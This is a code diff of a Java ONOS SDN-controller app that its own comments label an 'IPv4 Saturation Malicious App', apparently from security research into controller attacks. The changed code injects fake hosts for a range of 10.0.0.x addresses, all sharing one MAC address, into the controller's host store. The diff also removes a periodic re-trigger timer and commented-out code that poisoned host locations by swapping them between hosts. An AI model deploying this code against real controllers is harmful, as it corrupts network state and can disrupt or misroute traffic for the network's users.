@@ -40,13 +40,11 @@ import org.onlab.packet.VlanId;
 import org.onosproject.net.host.DefaultHostDescription;
 import org.onosproject.net.DefaultAnnotations;
 
-import java.util.Timer;
 import java.util.Random;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Set;
 import java.util.HashSet;
-import java.util.TimerTask;
 
 /**
  * IPv4 Saturation Malicious App.
@@ -71,83 +69,25 @@ public class IpSaturation {
     @Reference(cardinality = ReferenceCardinality.MANDATORY)
     protected DeviceStore deviceStore;
 
-    Timer timer = new Timer();
-    TimerTask timerTask = new TimerTask() {
-        @Override
-        public void run() {
-            log.info("Time up, running Task!");
-            editHostStore();
-        }
-    };
-
-    // --------------------------------------------------------
-    // CHANGE THIS PARAMETER TO TRIGGER THE APP EVERY X MILLISECONDS.
-    // --------------------------------------------------------
-    private static final long TIMEOUT = 10000;
-
     @Activate
     protected void activate() {
         coreService.registerApplication("org.edoardottt.ipsaturation.app", () -> log.info("Periscope down."));
-        // startTimer(TIMEOUT);
         editHostStore();
         log.info("Started ipsaturation App!");
     }
 
     @Deactivate
     protected void deactivate() {
-        // timer.cancel();
-        // timer.purge();
         log.info("Stopped ipsaturation App!");
     }
 
     // editHostStore mess up with the Host Data Store.
     private void editHostStore() {
-        /*
-         * // --- ORIGINAL CODE ---
-         * getHosts();
-         * HostId hId = pickRandomHost().id();
-         * emptyLocation(hId);
-         * DeviceId dId = pickRandomDevice().id();
-         * List<Port> ports = deviceStore.getPorts(dId);
-         * PortNumber pNumber = pickRandomPort(ports).number();
-         * HostLocation hl = new HostLocation(dId, pNumber, 0);
-         * hostStore.appendLocation(hId, hl);
-         * log.info("Malicious Host Tracking App: Host {} connected to device {}",
-         * hId.toString(), dId.toString());
-         * getHosts();
-         */
-
-        /*
-         * --- SWITCH LOCATIONS OF TWO HOSTS ---
-         * getHosts();
-         * HostId h1 = getHost(2).id();
-         * HostId h4 = getHost(0).id();
-         * getHosts();
-         * log.info("Malicious Host Tracking App: Selected host {} and host {}", h1,
-         * h4);
-         * Set<HostLocation> locationsH4 = getLocations(h4);
-         * Set<HostLocation> locationsH1 = getLocations(h1);
-         * log.info("Malicious Host Tracking App: Locations {} and {}", locationsH1,
-         * locationsH4);
-         * HostLocation newLocationH4 = locationsH1.iterator().next();
-         * HostLocation newLocationH1 = locationsH4.iterator().next();
-         * hostStore.appendLocation(h4, newLocationH4);
-         * hostStore.appendLocation(h1, newLocationH1);
-         * log.info("Malicious Host Tracking App: Locations {} and {}",
-         * getLocations(h1), getLocations(h4));
-         * hostStore.removeLocation(h1, newLocationH4);
-         * hostStore.removeLocation(h4, newLocationH1);
-         * log.
-         * info("Malicious Host Tracking App: Locations successfully poisoned: {} and {}"
-         * , getLocations(h1),
-         * getLocations(h4));
-         */
-
         int startIp = 5;
         int ipPool = 100;
         String baseIp = "10.0.0.";
 
-        for (int i = startIp; i <= ipPool; i++) {
+        for (int i = startIp; i < ipPool; i++) {
             String chosenIp = baseIp + String.valueOf(i);
             addHost(chosenIp);
         }
@@ -155,7 +95,7 @@ public class IpSaturation {
 
     // addHost
     private void addHost(String ipAddress) {
-        MacAddress mac = MacAddress.valueOf(ipAddress);
+        MacAddress mac = MacAddress.valueOf("00:00:00:00:00:10");
         Host h = pickRandomHost();
         VlanId vlan = h.vlan();
         Set<HostLocation> locations = h.locations();
@@ -169,16 +109,11 @@ public class IpSaturation {
         DefaultHostDescription hd = new DefaultHostDescription(mac, vlan, locations, ip, configured, annotations);
 
         ProviderId providerId = h.providerId();
-        HostId hostId = HostId.hostId(ipAddress);
+        HostId hostId = HostId.hostId(mac.toString() + "0" + ipAddress.split("\\.")[3]);
         boolean replaceIps = true;
         hostStore.createOrUpdateHost(providerId, hostId, hd, replaceIps);
 
         log.info("Added Host {}!", ipAddress);
-    }
-
-    // startTimer starts a timer that timeouts every X seconds.
-    private void startTimer(long timeout) {
-        timer.scheduleAtFixedRate(timerTask, 0, timeout);
     }
 
     // pickRandomHost picks a random host
